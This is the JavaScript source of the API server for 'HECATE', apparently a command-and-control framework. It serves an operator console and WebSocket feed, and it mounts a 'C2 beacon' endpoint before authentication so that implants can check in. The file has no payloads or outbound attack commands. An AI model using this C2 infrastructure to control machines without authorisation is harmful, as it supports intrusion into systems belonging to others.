'use strict';

/**
 * HECATE — API Server
 * Express + HTTP + WebSocket in one server.
 * C2 beacon endpoint mounted BEFORE auth middleware.
 * Exports start(opts), stop(), and registerModule(name, router).
 */

const http    = require('http');
const express = require('express');
const path = require('path');
const fs = require('fs');

const auth             = require('./middleware/auth');
const rateLimit        = require('./middleware/rate-limit');
const logger           = require('./middleware/logger');
const { errorHandler } = require('./middleware/error-handler');
const apiRouter        = require('./router');
const wsServer         = require('./websocket/ws-server');
const eventBridge      = require('./websocket/event-bridge');

const app = express();
app.set('trust proxy', 'loopback');
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false, limit: '10mb' }));
app.use(logger);
app.use(rateLimit);

// ── C2 beacon — registered before auth ───────────────────────────────────────
// Populated by server.start() after C2 module init
let _c2BeaconMiddleware = null;
app.post('/c2/beacon', (req, res) => {
  if (_c2BeaconMiddleware) return _c2BeaconMiddleware(req, res);
  res.status(204).end();
});

// ── Local browser session logout ─────────────────────────────────────────────
app.post('/api/v1/session/logout', auth, (req, res) => {
  res.setHeader('Set-Cookie', 'hecate_session=; Path=/; HttpOnly; SameSite=Strict; Max-Age=0');
  res.status(204).end();
});

// ── API routes (authenticated) ────────────────────────────────────────────────
// Authentication must be mounted on the actual API prefix. Mounting auth at
// /api does not automatically protect a separately registered /api/v1 stack.
app.use('/api/v1', auth, (req, res, next) => {
  req._hecateWsServer = wsServer;
  next();
}, apiRouter);

// ── Operator console ─────────────────────────────────────────────────────────
// Serve the built React console from the same local origin as the API.
// Mint the browser session before express.static() can terminate the index request.
const uiDist = path.resolve(__dirname, '..', 'ui', 'dist');
const uiIndex = path.join(uiDist, 'index.html');
app.use((req, res, next) => {
  if (req.path === '/' && fs.existsSync(uiIndex)) {
    res.setHeader('Set-Cookie', auth.sessionSetCookieHeader());
  }
  next();
});
if (fs.existsSync(uiDist)) app.use(express.static(uiDist, { index: 'index.html' }));

// ── Health (unauthenticated) ──────────────────────────────────────────────────
app.get('/health', (req, res) => res.json({ ok: true, ts: new Date().toISOString() }));

app.use((req, res) => res.status(404).json({ error: { code: 'NOT_FOUND', message: `${req.path} not found` } }));
app.use(errorHandler);

// ── HTTP Server ───────────────────────────────────────────────────────────────
let server = null;

function start(opts = {}) {
  const port = opts.port ?? parseInt(process.env.HECATE_PORT ?? '7331', 10);
  const host = opts.host ?? process.env.HECATE_HOST ?? '127.0.0.1';

  // Register C2 beacon middleware if C2 module is loaded
  if (opts.c2BeaconMiddleware) _c2BeaconMiddleware = opts.c2BeaconMiddleware;

  return new Promise((resolve, reject) => {
    server = http.createServer(app);
    wsServer.attach(server, { allowedOrigins: opts.wsOrigins });
    eventBridge.start();
    server.on('error', reject);
    server.listen(port, host, () => {
      process.stdout.write(JSON.stringify({ ts: new Date().toISOString(), event: 'hecate:start', host, port, pid: process.pid }) + '\n');
      resolve({ host, port });
    });
  });
}

/**
 * Stop all application-owned transports in dependency order.
 * WebSocket shutdown is awaited before the HTTP server is considered closed so
 * upgraded sockets cannot keep the test/process lifecycle pending.
 */
async function stop() {
  eventBridge.stop();
  await wsServer.close();

  const currentServer = server;
  if (!currentServer) return;

  await new Promise(resolve => {
    let settled = false;
    const finish = () => {
      if (settled) return;
      settled = true;
      server = null;
      resolve();
    };

    currentServer.close(finish);
    // Force-close active HTTP connections if a handler has failed to finish.
    setTimeout(() => currentServer.closeAllConnections?.(), 5000).unref();
  });
}

function registerModule(name, moduleRouter) {
  apiRouter.registerModule(name, moduleRouter);
}

module.exports = { app, start, stop, registerModule };
